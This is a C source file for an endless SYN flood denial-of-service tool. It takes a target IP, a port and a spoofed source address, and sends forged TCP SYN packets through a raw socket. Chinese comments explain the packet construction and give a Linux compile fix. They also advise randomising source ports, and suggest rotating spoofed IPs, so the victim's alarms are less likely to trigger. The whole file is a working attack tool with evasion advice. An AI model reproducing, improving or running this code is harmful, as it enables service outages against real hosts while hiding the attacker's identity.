#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
　
unsigned long srcport;

/*定义一个伪装地址的结构！*/
struct pseudohdr
{
    struct in_addr saddr;   /*源地址*/
    struct in_addr daddr;   /*目的地址*/
    u_char zero;
    u_char protocol;   /*协议类型*/
    u_short length;   /*TCP长度*/
    struct tcphdr tcpheader;
};

/*校验文件！包头是需要校验的，CRC校验！*/
/*因为我们使用RAW Socket发送数据报，所以我们只能自己来做校验*/
u_short
checksum(u_short * data,u_short length)
{
    int nleft = length;
    int sum=0;
    unsigned short *w = data;
    unsigned short value = 0;
    　
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    　
    if (nleft == 1) {
        *(unsigned char *) (&value) = *(unsigned char *) w;
        sum += value;
    }

    sum = (sum >>16) + (sum & 0xffff);
    sum += (sum >> 16);
    value = ~sum;
    return(value);
}

int
main(int argc,char * * argv)
{
    struct sockaddr_in sin;
    struct sockaddr_in din;
    struct hostent * hoste;
    struct hostent * host1;
    int j,sock,foo, flooddot=1;
    char buffer[40];
    struct ip * ipheader=(struct ip *) buffer;
    struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct ip));
    struct pseudohdr pseudoheader;
    　
    fprintf(stderr,"Syn attack against one port.(Infinite)/n");

    /*上面是判断参数！*/
    /*如果输入的格式错误，就显示详细使用方法我们可以看到他的使用方法是：#<编译后的程式名> <目标地址> <目标端口> <我们伪装的地址> */
    if(argc < 4) {
        fprintf(stderr,"usage: %s <dstIP> <dstport> <spoofed-srcIP>/n",argv[0]);
        return(-1);
    }

    fprintf(stderr,"%s:%s is being syn'd attacked by %s./n",argv[1],argv[2],argv[3]);
    bzero(&sin, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;

    if((host1=gethostbyname(argv[3])) != NULL) {
        /*检查输入的伪装地址是否符合格式要求，这里是以域名方式输入，并得到相对应的IP*/
        bcopy(host1->h_addr, &din.sin_addr, host1->h_length);
    }
    else if((din.sin_addr.s_addr=inet_addr(argv[3]))==-1) {
        /*检查输入的伪装地址是否符合格式要求，这里是以IP方式输入*/
        fprintf(stderr,"unknown source host %s/n",argv[3]);
        return(-1);
    }

    if((hoste=gethostbyname(argv[1])) != NULL) {
        /*检查输入的目标地址是否符合格式要求，这里是以域名方式输入，并得到相对应的IP*/
        bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
    }
    else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1) {
        /*检查输入的目标地址是否符合格式要求，这里是以IP方式输入*/
        fprintf(stderr,"unknown destination host %s/n",argv[1]);
        return(-1);
    }
    
    /*检查输入的目标端口是否符合要求*/
    if((sin.sin_port=htons(atoi(argv[2])))==0) {
        fprintf(stderr,"unknown port %s/n",argv[2]);
        return(-1);
    }

    /*大家看清了，在以RAW socket方式构造套接字描述符*/
    if((sock=socket(AF_INET,SOCK_RAW,255))==-1) {
        fprintf(stderr,"couldn't allocate raw socket/n");
        return(-1);
    }

    foo=1;
    /*重构报头！*/
    if(setsockopt(sock,0,IP_HDRINCL,(char *)&foo,sizeof(int))==-1) {
        fprintf(stderr,"couldn't set raw header on socket/n");
        return(-1);
    }
    
    for(j=1;j>0;j++) {
        /*clapnet:进入循环，开始攻击了。
        这里的j用在下面显示发包次数，但我个人并不赞同这么做。显示攻击次数会降低整个程序执行效率。我们要的就是洪水，我不关心洪水的流量！
        所以，如果你同意我的观点，把for 改成 while(1)就可以了*/

        bzero(&buffer,sizeof(struct ip)+sizeof(struct tcphdr));
        ipheader->ip_v=4;
        /*clapnet:题外话：目前使用的IP版本都是4*/
        ipheader->ip_tos=0;
        ipheader->ip_hl=sizeof(struct ip)/4;
        ipheader->ip_len=sizeof(struct ip)+sizeof(struct tcphdr);
        ipheader->ip_id=htons(random());
        ipheader->ip_ttl=30; /*255;*/
        /*clapnet:IP包的生命周期ttl=time to life*/
        ipheader->ip_p=IPPROTO_TCP;
        ipheader->ip_sum=0;
        ipheader->ip_src=din.sin_addr;
        ipheader->ip_dst=sin.sin_addr;
        　
        // tcpheader->th_sport=htons(srcport); /*sin.sin_port;*/
        // tcpheader->th_dport=sin.sin_port;
        // tcpheader->th_seq=htonl(0x28374839);
        // tcpheader->th_flags=TH_SYN;
        // tcpheader->th_off=sizeof(struct tcphdr)/4;
        // tcpheader->th_win=htons(2048);
        // tcpheader->th_sum=0;

        /*clapnet:嘿嘿，按照上面的进行编译，在Linux上是不会通过地！我在这里耽搁了30分钟。
        大家有兴趣可以看看tcp.h，上面的定义是给Free BSD地，如果是用Linux的兄弟，要这样改
        tcpheader->source=htons(srcport);
        源端口号
        tcpheader->dest=in.sin_port;
        目的端口号
        tcpheader->seq=htonl(0x28374839);
        SYN序列号
        tcpheader->ack=0;
        ACK序列号置为0
        tcpheader->syn=1;
        SYN 标志
        tcpheader->doff=sizeof(struct tcphdr)/4;
        tcpheader->window=htons(2048);
        窗口大小
        tcpheader->check=0;
        */
    /****************************************************************/
        tcpheader->source=htons(srcport);
        tcpheader->dest=sin.sin_port;
        tcpheader->seq=htonl(0x28374839);
        tcpheader->ack=0;
        tcpheader->syn=1;
        tcpheader->doff=sizeof(struct tcphdr)/4;
        tcpheader->window=htons(2048);
        tcpheader->check=0;
    /****************************************************************/

        bzero(&pseudoheader,12+sizeof(struct tcphdr));
        pseudoheader.saddr.s_addr=din.sin_addr.s_addr;   /*源地址*/
        pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;   /*目的地址*/
        pseudoheader.protocol=6;   /*协议类型*/
        pseudoheader.length=htons(sizeof(struct tcphdr));   /*TCP首部长度*/
        
        /*重构报头*/
        bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct tcphdr));
        tcpheader->check=checksum((u_short *) &pseudoheader,12+sizeof(struct tcphdr));

        /*端口当然要变！*/
        /*佳佳为什么强调端口一定要变呢？
        Easy！当对方收到来自同一个地址，同一个端口的数据包到达一定数量时，很容易触发对方的报警机制，从而作出一定的反映...
        当然，如果要做到尽善尽美，连虚拟的IP地址也要不断地变。这样才能使对方措手不及！*/
        srcport= (10000.0*random()/(15000+1.0));

        /*攻击开始！*/
        /*使用sendto函数发送我们制定的包*/
        if(sendto(sock,buffer,sizeof(struct ip)+sizeof(struct tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1) {
            fprintf(stderr,"couldn't send packet,%d/n",errno);
            return(-1);
        }

        usleep(2);
        /*显示次数！*/
        if (!(flooddot = (flooddot+1)%(1))) {
            fprintf(stdout,".");fflush(stdout);
        }
    } /*The end of the infinite loop*/

    close(sock);
    return(0);
} 